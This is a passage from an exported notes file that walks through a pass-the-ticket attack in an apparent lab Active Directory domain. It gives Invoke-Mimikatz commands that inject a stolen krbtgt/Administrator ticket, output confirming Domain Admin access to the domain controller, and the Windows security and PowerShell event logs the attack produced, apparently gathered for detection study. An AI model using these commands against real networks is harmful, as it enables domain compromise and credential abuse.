</rich_text></node></node></node></node><node custom_icon_id="0" foreground="" is_bold="False" name="3. Pass the krbtgt ticket using Invoke-Mimikatz" prog_lang="custom-colors" readonly="True" tags="" ts_creation="1562905957.2" ts_lastsave="1563116190.17" unique_id="212"><rich_text scale="h2">1. View the exported tickets:</rich_text><rich_text>

    </rich_text><rich_text justification="left"></rich_text><rich_text>
    </rich_text><rich_text justification="left"></rich_text><rich_text>

</rich_text><rich_text scale="h2">2. Pass the krbtgt ticket:</rich_text><rich_text>

    </rich_text><rich_text justification="left"></rich_text><rich_text>
    </rich_text><rich_text justification="left"></rich_text><rich_text>

</rich_text><rich_text scale="h2">3. View the cached tickets using </rich_text><rich_text family="monospace" scale="h2">klist</rich_text><rich_text scale="h2">:</rich_text><rich_text>

    </rich_text><rich_text justification="left"></rich_text><rich_text>
</rich_text><rich_text family="monospace">
</rich_text><rich_text scale="h3">    NOTE(S):
      ▪ The current ticket for the session is now </rich_text><rich_text family="monospace" scale="h3">Administrator @ BOSSMANBEN.LOCAL</rich_text><rich_text scale="h3"> which is a Domain Administrator
      ▪ The current PSSession should now be able to impersonate the Domain Administrator</rich_text><rich_text>

</rich_text><rich_text scale="h2">4. Check if the Domain Controller (BOSSMANBEN) now accessible:</rich_text><rich_text>

    </rich_text><rich_text justification="left"></rich_text><rich_text>
    </rich_text><rich_text justification="left"></rich_text><rich_text>
</rich_text><rich_text scale="h2">    </rich_text><rich_text>
    </rich_text><rich_text justification="left"></rich_text><rich_text>  
    </rich_text><rich_text justification="left"></rich_text><rich_text>
</rich_text><rich_text scale="h2">    </rich_text><rich_text>
    </rich_text><rich_text justification="left"></rich_text><rich_text>
    </rich_text><rich_text justification="left"></rich_text><rich_text>

</rich_text><rich_text scale="h3">    NOTE(S):
      ▪ The file shares in the Domain Controller (BOSSMANBEN) are now accessible as long as the Domain Controller is being accessed using kerberos authentication.
      ▪ Commands could also be executed in the context of the Domain Controller (BOSSMANBEN) using the </rich_text><rich_text family="monospace" scale="h3">Invoke-Command</rich_text><rich_text scale="h3"> module in PowerShell.</rich_text><rich_text>

</rich_text><rich_text scale="h3">~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</rich_text><rich_text>

</rich_text><rich_text scale="h1" weight="heavy">LOGS GENERATED:</rich_text><rich_text>
</rich_text><rich_text scale="h2">   ◇ </rich_text><rich_text link="node 262" scale="h2">Remote Machine Logs</rich_text><rich_text>
</rich_text><rich_text scale="h2">   ◇ </rich_text><rich_text link="node 277" scale="h2">AD Logs</rich_text><rich_text>

</rich_text><codebox char_offset="35" frame_height="40" frame_width="91" highlight_brackets="True" show_line_numbers="False" syntax_highlighting="powershell" width_in_pixels="False">dir $home\Desktop\tickets</codebox><codebox char_offset="41" frame_height="85" frame_width="91" highlight_brackets="True" show_line_numbers="False" syntax_highlighting="powershell" width_in_pixels="False">...omitted...
-a----       12/07/2019   4:53 PM           1611 [0;4a16d]-2-0-40e10000-Administrator@krbtgt-BOSSMANBEN.LOCAL.kirbi
...omitted...
</codebox><codebox char_offset="76" frame_height="40" frame_width="91" highlight_brackets="True" show_line_numbers="False" syntax_highlighting="powershell" width_in_pixels="False">Invoke-Mimikatz -command '&quot;kerberos::ptt [0;4a16d]-2-0-40e10000-Administrator@krbtgt-BOSSMANBEN.LOCAL.kirbi&quot;'</codebox><codebox char_offset="82" frame_height="205" frame_width="91" highlight_brackets="True" show_line_numbers="False" syntax_highlighting="powershell" width_in_pixels="False">  .#####.   mimikatz 2.2.0 (x64) #18362 May 30 2019 09:58:36
 .## ^ ##.  &quot;A La Vie, A L'Amour&quot; - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       &gt; http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        &gt; http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(powershell) # kerberos::ptt [0;4a16d]-2-0-40e10000-Administrator@krbtgt-BOSSMANBEN.LOCAL.kirbi

* File: '[0;4a16d]-2-0-40e10000-Administrator@krbtgt-BOSSMANBEN.LOCAL.kirbi': OK</codebox><codebox char_offset="130" frame_height="280" frame_width="91" highlight_brackets="True" show_line_numbers="False" syntax_highlighting="powershell" width_in_pixels="False">Current LogonId is 0:0xd0ebf

Cached Tickets: (1)

#0&gt;     Client: Administrator @ BOSSMANBEN.LOCAL
        Server: krbtgt/BOSSMANBEN.LOCAL @ BOSSMANBEN.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40e10000 -&gt; forwardable renewable initial pre_authent name_canonicalize
        Start Time: 7/12/2019 16:38:17 (local)
        End Time:   7/13/2019 2:38:17 (local)
        Renew Time: 7/19/2019 16:38:17 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0x1 -&gt; PRIMARY
        Kdc Called:</codebox><codebox char_offset="419" frame_height="40" frame_width="91" highlight_brackets="True" show_line_numbers="False" syntax_highlighting="powershell" width_in_pixels="False">nltest /DCNAME:BOSSMANBEN</codebox><codebox char_offset="425" frame_height="55" frame_width="91" highlight_brackets="True" show_line_numbers="False" syntax_highlighting="powershell" width_in_pixels="False">PDC for Domain BOSSMANBEn is \\WIN-BO2CT95INDP
The command completed successfully</codebox><codebox char_offset="436" frame_height="40" frame_width="91" highlight_brackets="True" show_line_numbers="False" syntax_highlighting="powershell" width_in_pixels="False">dir \\WIN-BO2CT95INDP\C$</codebox><codebox char_offset="444" frame_height="220" frame_width="91" highlight_brackets="True" show_line_numbers="False" syntax_highlighting="powershell" width_in_pixels="False">    Directory: \\WIN-BO2CT95INDP\C$


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       16/07/2016   6:23 AM                PerfLogs
d-r---       09/07/2019   3:01 PM                Program Files
d-----       16/07/2016   6:23 AM                Program Files (x86)
d-r---       09/07/2019   3:01 PM                Users
d-----       09/07/2019   3:10 PM                Windows
-a----       11/07/2019  12:53 PM              5 gg</codebox><codebox char_offset="455" frame_height="40" frame_width="91" highlight_brackets="True" show_line_numbers="False" syntax_highlighting="powershell" width_in_pixels="False">Invoke-Command -ComputerName WIN-BO2CT95INDP -ScriptBlock { whoami }</codebox><codebox char_offset="461" frame_height="40" frame_width="91" highlight_brackets="True" show_line_numbers="False" syntax_highlighting="powershell" width_in_pixels="False">bossmanben\administrator</codebox><node custom_icon_id="0" foreground="" is_bold="False" name="Remote Machine Logs" prog_lang="custom-colors" readonly="True" tags="" ts_creation="1563112532.04" ts_lastsave="1563116100.16" unique_id="262"><rich_text scale="h1" weight="heavy">LOGS GENERATED:</rich_text><rich_text>
</rich_text><rich_text scale="h2">• LogName: Security</rich_text><rich_text>:
</rich_text><rich_text scale="h3">
    2.1. </rich_text><rich_text link="node 253" scale="h3">4624 - Logon (Success)</rich_text><rich_text scale="h3">
    2.2. </rich_text><rich_text link="node 252" scale="h3">4624 - Logon (Success)</rich_text><rich_text scale="h3">
</rich_text><rich_text>
</rich_text><rich_text scale="h2">• PoweShell Logs:</rich_text><rich_text>

</rich_text><rich_text scale="h3">    2.1. </rich_text><rich_text link="node 267" scale="h3">4103 - Executing Pipeline</rich_text><rich_text scale="h3">
    2.2. </rich_text><rich_text link="node 268" scale="h3">4103 - Executing Pipeline</rich_text><rich_text scale="h3">
    2.3. </rich_text><rich_text link="node 269" scale="h3">4103 - Executing Pipeline</rich_text><rich_text scale="h3">
    2.4. </rich_text><rich_text link="node 270" scale="h3">4103 - Executing Pipeline</rich_text><rich_text scale="h3">
    2.5. </rich_text><rich_text link="node 271" scale="h3">4103 - Executing Pipeline</rich_text><rich_text scale="h3">
    2.6. </rich_text><rich_text link="node 272" scale="h3">4103 - Executing Pipeline</rich_text><rich_text>
    
   </rich_text><rich_text scale="h3">   ◇</rich_text><rich_text scale="h3" style="italic">  2.1 - 2.7 loops multiple times</rich_text><rich_text>

</rich_text><rich_text scale="h3">    4.b.1. </rich_text><rich_text link="node 273" scale="h3">4103 - Executing Pipeline</rich_text><rich_text scale="h3">
    
    4.c.1. </rich_text><rich_text link="node 274" scale="h3">4104 - Execute a Remote Command</rich_text><rich_text scale="h3">
    4.c.2. </rich_text><rich_text link="node 275" scale="h3">4103 - Executing Pipeline</rich_text><rich_text scale="h3">
    4.c.3. </rich_text><rich_text link="node 276" scale="h3">4103 - Executing Pipeline</rich_text><node custom_icon_id="0" foreground="" is_bold="False" name="LogName: Security" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1563112568.24" ts_lastsave="1563112668.52" unique_id="263"><rich_text></rich_text><node custom_icon_id="0" foreground="" is_bold="False" name="2.1. 4624 - Logon (Sucess)" prog_lang="xml" readonly="True" tags="" ts_creation="1563112614.53" ts_lastsave="1563112629.44" unique_id="264"><rich_text>- &lt;Event xmlns=&quot;http://schemas.microsoft.com/win/2004/08/events/event&quot;&gt;
- &lt;System&gt;
      &lt;Provider Name=&quot;Microsoft-Windows-Security-Auditing&quot; Guid=&quot;{54849625-5478-4994-a5ba-3e3b0328c30d}&quot; /&gt; 
      &lt;EventID&gt;4624&lt;/EventID&gt; 
      &lt;Version&gt;2&lt;/Version&gt; 
      &lt;Level&gt;0&lt;/Level&gt; 
      &lt;Task&gt;12544&lt;/Task&gt; 
      &lt;Opcode&gt;0&lt;/Opcode&gt; 
      &lt;Keywords&gt;0x8020000000000000&lt;/Keywords&gt; 
      &lt;TimeCreated SystemTime=&quot;2019-07-15T04:53:17.255123500Z&quot; /&gt; 
      &lt;EventRecordID&gt;159653&lt;/EventRecordID&gt; 
      &lt;Correlation ActivityID=&quot;{44acdfc2-3ac4-0002-2be0-ac44c43ad501}&quot; /&gt; 
      &lt;Execution ProcessID=&quot;700&quot; ThreadID=&quot;5152&quot; /&gt; 
      &lt;Channel&gt;Security&lt;/Channel&gt; 
      &lt;Computer&gt;MSEDGEWIN10.bossmanben.local&lt;/Computer&gt; 
      &lt;Security /&gt; 
  &lt;/System&gt;
- &lt;EventData&gt;
      &lt;Data Name=&quot;SubjectUserSid&quot;&gt;S-1-0-0&lt;/Data&gt; 
      &lt;Data Name=&quot;SubjectUserName&quot;&gt;-&lt;/Data&gt; 
      &lt;Data Name=&quot;SubjectDomainName&quot;&gt;-&lt;/Data&gt; 
      &lt;Data Name=&quot;SubjectLogonId&quot;&gt;0x0&lt;/Data&gt; 
      &lt;Data Name=&quot;TargetUserSid&quot;&gt;S-1-5-21-2817836110-3135048609-2922248965-1105&lt;/Data&gt; 
      &lt;Data Name=&quot;TargetUserName&quot;&gt;GConcy&lt;/Data&gt; 
      &lt;Data Name=&quot;TargetDomainName&quot;&gt;BOSSMANBEN&lt;/Data&gt; 
      &lt;Data Name=&quot;TargetLogonId&quot;&gt;0x281c3c&lt;/Data&gt; 
      &lt;Data Name=&quot;LogonType&quot;&gt;3&lt;/Data&gt; 
      &lt;Data Name=&quot;LogonProcessName&quot;&gt;NtLmSsp&lt;/Data&gt; 
      &lt;Data Name=&quot;AuthenticationPackageName&quot;&gt;NTLM&lt;/Data&gt; 
      &lt;Data Name=&quot;WorkstationName&quot;&gt;KALI-WINDOWS&lt;/Data&gt; 
      &lt;Data Name=&quot;LogonGuid&quot;&gt;{00000000-0000-0000-0000-000000000000}&lt;/Data&gt; 
      &lt;Data Name=&quot;TransmittedServices&quot;&gt;-&lt;/Data&gt; 
      &lt;Data Name=&quot;LmPackageName&quot;&gt;NTLM V2&lt;/Data&gt; 
      &lt;Data Name=&quot;KeyLength&quot;&gt;128&lt;/Data&gt; 
      &lt;Data Name=&quot;ProcessId&quot;&gt;0x0&lt;/Data&gt; 
      &lt;Data Name=&quot;ProcessName&quot;&gt;-&lt;/Data&gt; 
      &lt;Data Name=&quot;IpAddress&quot;&gt;-&lt;/Data&gt; 
      &lt;Data Name=&quot;IpPort&quot;&gt;-&lt;/Data&gt; 
      &lt;Data Name=&quot;ImpersonationLevel&quot;&gt;%%1833&lt;/Data&gt; 
      &lt;Data Name=&quot;RestrictedAdminMode&quot;&gt;-&lt;/Data&gt; 
      &lt;Data Name=&quot;TargetOutboundUserName&quot;&gt;-&lt;/Data&gt; 
      &lt;Data Name=&quot;TargetOutboundDomainName&quot;&gt;-&lt;/Data&gt; 
      &lt;Data Name=&quot;VirtualAccount&quot;&gt;%%1843&lt;/Data&gt; 
      &lt;Data Name=&quot;TargetLinkedLogonId&quot;&gt;0x0&lt;/Data&gt; 
      &lt;Data Name=&quot;ElevatedToken&quot;&gt;%%1842&lt;/Data&gt; 
  &lt;/EventData&gt;
  &lt;/Event&gt;</rich_text></node><node custom_icon_id="0" foreground="" is_bold="False" name="2.2. 4624 - Logon (Sucess)" prog_lang="xml" readonly="True" tags="" ts_creation="1563112616.8" ts_lastsave="1563112650.69" unique_id="265"><rich_text>- &lt;Event xmlns=&quot;http://schemas.microsoft.com/win/2004/08/events/event&quot;&gt;
- &lt;System&gt;
      &lt;Provider Name=&quot;Microsoft-Windows-Security-Auditing&quot; Guid=&quot;{54849625-5478-4994-a5ba-3e3b0328c30d}&quot; /&gt; 
      &lt;EventID&gt;4624&lt;/EventID&gt; 
      &lt;Version&gt;2&lt;/Version&gt; 
      &lt;Level&gt;0&lt;/Level&gt; 
      &lt;Task&gt;12544&lt;/Task&gt; 
      &lt;Opcode&gt;0&lt;/Opcode&gt; 
      &lt;Keywords&gt;0x8020000000000000&lt;/Keywords&gt; 
      &lt;TimeCreated SystemTime=&quot;2019-07-15T04:53:17.282386900Z&quot; /&gt; 
      &lt;EventRecordID&gt;159659&lt;/EventRecordID&gt; 
      &lt;Correlation ActivityID=&quot;{44acdfc2-3ac4-0002-2be0-ac44c43ad501}&quot; /&gt; 
      &lt;Execution ProcessID=&quot;700&quot; ThreadID=&quot;5152&quot; /&gt; 
      &lt;Channel&gt;Security&lt;/Channel&gt; 
      &lt;Computer&gt;MSEDGEWIN10.bossmanben.local&lt;/Computer&gt; 
      &lt;Security /&gt; 
  &lt;/System&gt;
- &lt;EventData&gt;
      &lt;Data Name=&quot;SubjectUserSid&quot;&gt;S-1-0-0&lt;/Data&gt; 
      &lt;Data Name=&quot;SubjectUserName&quot;&gt;-&lt;/Data&gt; 
      &lt;Data Name=&quot;SubjectDomainName&quot;&gt;-&lt;/Data&gt; 
      &lt;Data Name=&quot;SubjectLogonId&quot;&gt;0x0&lt;/Data&gt; 
      &lt;Data Name=&quot;TargetUserSid&quot;&gt;S-1-5-21-2817836110-3135048609-2922248965-1105&lt;/Data&gt; 
      &lt;Data Name=&quot;TargetUserName&quot;&gt;GConcy&lt;/Data&gt; 
      &lt;Data Name=&quot;TargetDomainName&quot;&gt;BOSSMANBEN&lt;/Data&gt; 
      &lt;Data Name=&quot;TargetLogonId&quot;&gt;0x281c9b&lt;/Data&gt; 
      &lt;Data Name=&quot;LogonType&quot;&gt;3&lt;/Data&gt; 
      &lt;Data Name=&quot;LogonProcessName&quot;&gt;NtLmSsp&lt;/Data&gt; 
      &lt;Data Name=&quot;AuthenticationPackageName&quot;&gt;NTLM&lt;/Data&gt; 
      &lt;Data Name=&quot;WorkstationName&quot;&gt;KALI-WINDOWS&lt;/Data&gt; 
      &lt;Data Name=&quot;LogonGuid&quot;&gt;{00000000-0000-0000-0000-000000000000}&lt;/Data&gt; 
      &lt;Data Name=&quot;TransmittedServices&quot;&gt;-&lt;/Data&gt; 
      &lt;Data Name=&quot;LmPackageName&quot;&gt;NTLM V2&lt;/Data&gt; 
      &lt;Data Name=&quot;KeyLength&quot;&gt;128&lt;/Data&gt; 
      &lt;Data Name=&quot;ProcessId&quot;&gt;0x0&lt;/Data&gt; 
      &lt;Data Name=&quot;ProcessName&quot;&gt;-&lt;/Data&gt; 
      &lt;Data Name=&quot;IpAddress&quot;&gt;-&lt;/Data&gt; 
      &lt;Data Name=&quot;IpPort&quot;&gt;-&lt;/Data&gt; 
      &lt;Data Name=&quot;ImpersonationLevel&quot;&gt;%%1833&lt;/Data&gt; 
      &lt;Data Name=&quot;RestrictedAdminMode&quot;&gt;-&lt;/Data&gt; 
      &lt;Data Name=&quot;TargetOutboundUserName&quot;&gt;-&lt;/Data&gt; 
      &lt;Data Name=&quot;TargetOutboundDomainName&quot;&gt;-&lt;/Data&gt; 
      &lt;Data Name=&quot;VirtualAccount&quot;&gt;%%1843&lt;/Data&gt; 
      &lt;Data Name=&quot;TargetLinkedLogonId&quot;&gt;0x0&lt;/Data&gt; 
      &lt;Data Name=&quot;ElevatedToken&quot;&gt;%%1842&lt;/Data&gt; 
  &lt;/EventData&gt;
  &lt;/Event&gt;</rich_text></node></node><node custom_icon_id="0" foreground="" is_bold="False" name="PowerShell Logs" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1563112668.67" ts_lastsave="1563113397.88" unique_id="266"><rich_text></rich_text><node custom_icon_id="0" foreground="" is_bold="False" name="2.1. 4103 - Executing Pipeline" prog_lang="xml" readonly="True" tags="" ts_creation="1563112935.81" ts_lastsave="1563112953.58" unique_id="267"><rich_text>- &lt;Event xmlns=&quot;http://schemas.microsoft.com/win/2004/08/events/event&quot;&gt;
- &lt;System&gt;
      &lt;Provider Name=&quot;Microsoft-Windows-PowerShell&quot; Guid=&quot;{a0c1853b-5c40-4b15-8766-3cf1c58f985a}&quot; /&gt; 
      &lt;EventID&gt;4103&lt;/EventID&gt; 
      &lt;Version&gt;1&lt;/Version&gt; 
      &lt;Level&gt;4&lt;/Level&gt; 
      &lt;Task&gt;106&lt;/Task&gt; 
      &lt;Opcode&gt;20&lt;/Opcode&gt; 
      &lt;Keywords&gt;0x0&lt;/Keywords&gt; 
      &lt;TimeCreated SystemTime=&quot;2019-07-15T04:53:17.465580000Z&quot; /&gt; 
      &lt;EventRecordID&gt;626987&lt;/EventRecordID&gt; 
      &lt;Correlation ActivityID=&quot;{44acdfc2-3ac4-0003-e836-ad44c43ad501}&quot; /&gt; 
      &lt;Execution ProcessID=&quot;7512&quot; ThreadID=&quot;3784&quot; /&gt; 
      &lt;Channel&gt;Microsoft-Windows-PowerShell/Operational&lt;/Channel&gt; 
      &lt;Computer&gt;MSEDGEWIN10.bossmanben.local&lt;/Computer&gt; 
      &lt;Security UserID=&quot;S-1-5-21-2817836110-3135048609-2922248965-1105&quot; /&gt; 
  &lt;/System&gt;
- &lt;EventData&gt;
      &lt;Data Name=&quot;ContextInfo&quot;&gt;Severity = Informational Host Name = ServerRemoteHost Host Version = 1.0.0.0 Host ID = 7f9028a3-ed59-4936-aef0-89bd3539d9d1 Host Application = C:\Windows\system32\wsmprovhost.exe -Embedding Engine Version = 5.1.17763.316 Runspace ID = d337e29f-65b4-49e8-991c-bbf85ca80eb8 Pipeline ID = 38 Command Name = New-Object Command Type = Cmdlet Script Name = C:\Users\GConcy\Desktop\Invoke-Mimikatz.ps1 Command Path = Sequence Number = 24534 User = BOSSMANBEN\GConcy Connected User = BOSSMANBEN\GConcy Shell ID = Microsoft.PowerShell&lt;/Data&gt; 
      &lt;Data Name=&quot;UserData&quot; /&gt; 
      &lt;Data Name=&quot;Payload&quot;&gt;CommandInvocation(New-Object): &quot;New-Object&quot; ParameterBinding(New-Object): name=&quot;TypeName&quot;; value=&quot;IntPtr&quot;&lt;/Data&gt; 
  &lt;/EventData&gt;
  &lt;/Event&gt;</rich_text></node><node custom_icon_id="0" foreground="" is_bold="False" name="2.2. 4103 - Executing Pipeline" prog_lang="xml" readonly="True" tags="" ts_creation="1563112937.15" ts_lastsave="1563112971.17" unique_id="268"><rich_text>- &lt;Event xmlns=&quot;http://schemas.microsoft.com/win/2004/08/events/event&quot;&gt;
- &lt;System&gt;
      &lt;Provider Name=&quot;Microsoft-Windows-PowerShell&quot; Guid=&quot;{a0c1853b-5c40-4b15-8766-3cf1c58f985a}&quot; /&gt; 
      &lt;EventID&gt;4103&lt;/EventID&gt; 
      &lt;Version&gt;1&lt;/Version&gt; 
      &lt;Level&gt;4&lt;/Level&gt; 
      &lt;Task&gt;106&lt;/Task&gt; 
      &lt;Opcode&gt;20&lt;/Opcode&gt; 
      &lt;Keywords&gt;0x0&lt;/Keywords&gt; 
      &lt;TimeCreated SystemTime=&quot;2019-07-15T04:53:17.467066500Z&quot; /&gt; 
      &lt;EventRecordID&gt;626988&lt;/EventRecordID&gt; 
      &lt;Correlation ActivityID=&quot;{44acdfc2-3ac4-0003-e936-ad44c43ad501}&quot; /&gt; 
      &lt;Execution ProcessID=&quot;7512&quot; ThreadID=&quot;3784&quot; /&gt; 
      &lt;Channel&gt;Microsoft-Windows-PowerShell/Operational&lt;/Channel&gt; 
      &lt;Computer&gt;MSEDGEWIN10.bossmanben.local&lt;/Computer&gt; 
      &lt;Security UserID=&quot;S-1-5-21-2817836110-3135048609-2922248965-1105&quot; /&gt; 
  &lt;/System&gt;
- &lt;EventData&gt;
      &lt;Data Name=&quot;ContextInfo&quot;&gt;Severity = Informational Host Name = ServerRemoteHost Host Version = 1.0.0.0 Host ID = 7f9028a3-ed59-4936-aef0-89bd3539d9d1 Host Application = C:\Windows\system32\wsmprovhost.exe -Embedding Engine Version = 5.1.17763.316 Runspace ID = d337e29f-65b4-49e8-991c-bbf85ca80eb8 Pipeline ID = 38 Command Name = New-Object Command Type = Cmdlet Script Name = C:\Users\GConcy\Desktop\Invoke-Mimikatz.ps1 Command Path = Sequence Number = 24536 User = BOSSMANBEN\GConcy Connected User = BOSSMANBEN\GConcy Shell ID = Microsoft.PowerShell&lt;/Data&gt; 
      &lt;Data Name=&quot;UserData&quot; /&gt; 
      &lt;Data Name=&quot;Payload&quot;&gt;CommandInvocation(New-Object): &quot;New-Object&quot; ParameterBinding(New-Object): name=&quot;TypeName&quot;; value=&quot;System.Runtime.InteropServices.HandleRef&quot; ParameterBinding(New-Object): name=&quot;ArgumentList&quot;; value=&quot;0, 140716782714880&quot;&lt;/Data&gt; 
  &lt;/EventData&gt;
  &lt;/Event&gt;</rich_text></node><node custom_icon_id="0" foreground="" is_bold="False" name="2.3. 4103 - Executing Pipeline" prog_lang="xml" readonly="True" tags="" ts_creation="1563112937.59" ts_lastsave="1563112986.17" unique_id="269"><rich_text>- &lt;Event xmlns=&quot;http://schemas.microsoft.com/win/2004/08/events/event&quot;&gt;
- &lt;System&gt;
      &lt;Provider Name=&quot;Microsoft-Windows-PowerShell&quot; Guid=&quot;{a0c1853b-5c40-4b15-8766-3cf1c58f985a}&quot; /&gt; 
      &lt;EventID&gt;4103&lt;/EventID&gt; 
      &lt;Version&gt;1&lt;/Version&gt; 
      &lt;Level&gt;4&lt;/Level&gt; 
      &lt;Task&gt;106&lt;/Task&gt; 
      &lt;Opcode&gt;20&lt;/Opcode&gt; 
      &lt;Keywords&gt;0x0&lt;/Keywords&gt; 
      &lt;TimeCreated SystemTime=&quot;2019-07-15T04:53:17.468184500Z&quot; /&gt; 
      &lt;EventRecordID&gt;626989&lt;/EventRecordID&gt; 
      &lt;Correlation ActivityID=&quot;{44acdfc2-3ac4-0003-ea36-ad44c43ad501}&quot; /&gt; 
      &lt;Execution ProcessID=&quot;7512&quot; ThreadID=&quot;3784&quot; /&gt; 
      &lt;Channel&gt;Microsoft-Windows-PowerShell/Operational&lt;/Channel&gt; 
      &lt;Computer&gt;MSEDGEWIN10.bossmanben.local&lt;/Computer&gt; 
      &lt;Security UserID=&quot;S-1-5-21-2817836110-3135048609-2922248965-1105&quot; /&gt; 
  &lt;/System&gt;
- &lt;EventData&gt;
      &lt;Data Name=&quot;ContextInfo&quot;&gt;Severity = Informational Host Name = ServerRemoteHost Host Version = 1.0.0.0 Host ID = 7f9028a3-ed59-4936-aef0-89bd3539d9d1 Host Application = C:\Windows\system32\wsmprovhost.exe -Embedding Engine Version = 5.1.17763.316 Runspace ID = d337e29f-65b4-49e8-991c-bbf85ca80eb8 Pipeline ID = 38 Command Name = Write-Output Command Type = Cmdlet Script Name = C:\Users\GConcy\Desktop\Invoke-Mimikatz.ps1 Command Path = Sequence Number = 24538 User = BOSSMANBEN\GConcy Connected User = BOSSMANBEN\GConcy Shell ID = Microsoft.PowerShell&lt;/Data&gt; 
      &lt;Data Name=&quot;UserData&quot; /&gt; 
      &lt;Data Name=&quot;Payload&quot;&gt;CommandInvocation(Write-Output): &quot;Write-Output&quot; ParameterBinding(Write-Output): name=&quot;InputObject&quot;; value=&quot;140716782822912&quot;&lt;/Data&gt; 
  &lt;/EventData&gt;
  &lt;/Event&gt;</rich_text></node><node custom_icon_id="0" foreground="" is_bold="False" name="2.4. 4103 - Executing Pipeline" prog_lang="xml" readonly="True" tags="" ts_creation="1563112938.02" ts_lastsave="1563113004.49" unique_id="270"><rich_text>- &lt;Event xmlns=&quot;http://schemas.microsoft.com/win/2004/08/events/event&quot;&gt;
- &lt;System&gt;
      &lt;Provider Name=&quot;Microsoft-Windows-PowerShell&quot; Guid=&quot;{a0c1853b-5c40-4b15-8766-3cf1c58f985a}&quot; /&gt; 
      &lt;EventID&gt;4103&lt;/EventID&gt; 
      &lt;Version&gt;1&lt;/Version&gt; 
      &lt;Level&gt;4&lt;/Level&gt; 
      &lt;Task&gt;106&lt;/Task&gt; 
      &lt;Opcode&gt;20&lt;/Opcode&gt; 
      &lt;Keywords&gt;0x0&lt;/Keywords&gt; 
      &lt;TimeCreated SystemTime=&quot;2019-07-15T04:53:17.470547800Z&quot; /&gt; 
      &lt;EventRecordID&gt;626990&lt;/EventRecordID&gt; 
      &lt;Correlation ActivityID=&quot;{44acdfc2-3ac4-0003-ec36-ad44c43ad501}&quot; /&gt; 
      &lt;Execution ProcessID=&quot;7512&quot; ThreadID=&quot;3784&quot; /&gt; 
      &lt;Channel&gt;Microsoft-Windows-PowerShell/Operational&lt;/Channel&gt; 
      &lt;Computer&gt;MSEDGEWIN10.bossmanben.local&lt;/Computer&gt; 
      &lt;Security UserID=&quot;S-1-5-21-2817836110-3135048609-2922248965-1105&quot; /&gt; 
  &lt;/System&gt;
- &lt;EventData&gt;
      &lt;Data Name=&quot;ContextInfo&quot;&gt;Severity = Informational Host Name = ServerRemoteHost Host Version = 1.0.0.0 Host ID = 7f9028a3-ed59-4936-aef0-89bd3539d9d1 Host Application = C:\Windows\system32\wsmprovhost.exe -Embedding Engine Version = 5.1.17763.316 Runspace ID = d337e29f-65b4-49e8-991c-bbf85ca80eb8 Pipeline ID = 38 Command Name = New-Object Command Type = Cmdlet Script Name = C:\Users\GConcy\Desktop\Invoke-Mimikatz.ps1 Command Path = Sequence Number = 24540 User = BOSSMANBEN\GConcy Connected User = BOSSMANBEN\GConcy Shell ID = Microsoft.PowerShell&lt;/Data&gt; 
      &lt;Data Name=&quot;UserData&quot; /&gt; 
      &lt;Data Name=&quot;Payload&quot;&gt;CommandInvocation(New-Object): &quot;New-Object&quot; ParameterBinding(New-Object): name=&quot;TypeName&quot;; value=&quot;System.Reflection.AssemblyName&quot; ParameterBinding(New-Object): name=&quot;ArgumentList&quot;; value=&quot;ReflectedDelegate&quot;&lt;/Data&gt; 
  &lt;/EventData&gt;
  &lt;/Event&gt;</rich_text></node><node custom_icon_id="0" foreground="" is_bold="False" name="2.5. 4103 - Executing Pipeline" prog_lang="xml" readonly="True" tags="" ts_creation="1563112938.5" ts_lastsave="1563113034.7" unique_id="271"><rich_text>- &lt;Event xmlns=&quot;http://schemas.microsoft.com/win/2004/08/events/event&quot;&gt;
- &lt;System&gt;
      &lt;Provider Name=&quot;Microsoft-Windows-PowerShell&quot; Guid=&quot;{a0c1853b-5c40-4b15-8766-3cf1c58f985a}&quot; /&gt; 
      &lt;EventID&gt;4103&lt;/EventID&gt; 
      &lt;Version&gt;1&lt;/Version&gt; 
      &lt;Level&gt;4&lt;/Level&gt; 
      &lt;Task&gt;106&lt;/Task&gt; 
      &lt;Opcode&gt;20&lt;/Opcode&gt; 
      &lt;Keywords&gt;0x0&lt;/Keywords&gt; 
      &lt;TimeCreated SystemTime=&quot;2019-07-15T04:53:17.472653600Z&quot; /&gt; 
      &lt;EventRecordID&gt;626991&lt;/EventRecordID&gt; 
      &lt;Correlation ActivityID=&quot;{44acdfc2-3ac4-0003-ed36-ad44c43ad501}&quot; /&gt; 
      &lt;Execution ProcessID=&quot;7512&quot; ThreadID=&quot;3784&quot; /&gt; 
      &lt;Channel&gt;Microsoft-Windows-PowerShell/Operational&lt;/Channel&gt; 
      &lt;Computer&gt;MSEDGEWIN10.bossmanben.local&lt;/Computer&gt; 
      &lt;Security UserID=&quot;S-1-5-21-2817836110-3135048609-2922248965-1105&quot; /&gt; 
  &lt;/System&gt;
- &lt;EventData&gt;
      &lt;Data Name=&quot;ContextInfo&quot;&gt;Severity = Informational Host Name = ServerRemoteHost Host Version = 1.0.0.0 Host ID = 7f9028a3-ed59-4936-aef0-89bd3539d9d1 Host Application = C:\Windows\system32\wsmprovhost.exe -Embedding Engine Version = 5.1.17763.316 Runspace ID = d337e29f-65b4-49e8-991c-bbf85ca80eb8 Pipeline ID = 38 Command Name = Write-Output Command Type = Cmdlet Script Name = C:\Users\GConcy\Desktop\Invoke-Mimikatz.ps1 Command Path = Sequence Number = 24542 User = BOSSMANBEN\GConcy Connected User = BOSSMANBEN\GConcy Shell ID = Microsoft.PowerShell&lt;/Data&gt; 
      &lt;Data Name=&quot;UserData&quot; /&gt; 
      &lt;Data Name=&quot;Payload&quot;&gt;CommandInvocation(Write-Output): &quot;Write-Output&quot; ParameterBinding(Write-Output): name=&quot;InputObject&quot;; value=&quot;MyDelegateType&quot;&lt;/Data&gt; 
  &lt;/EventData&gt;
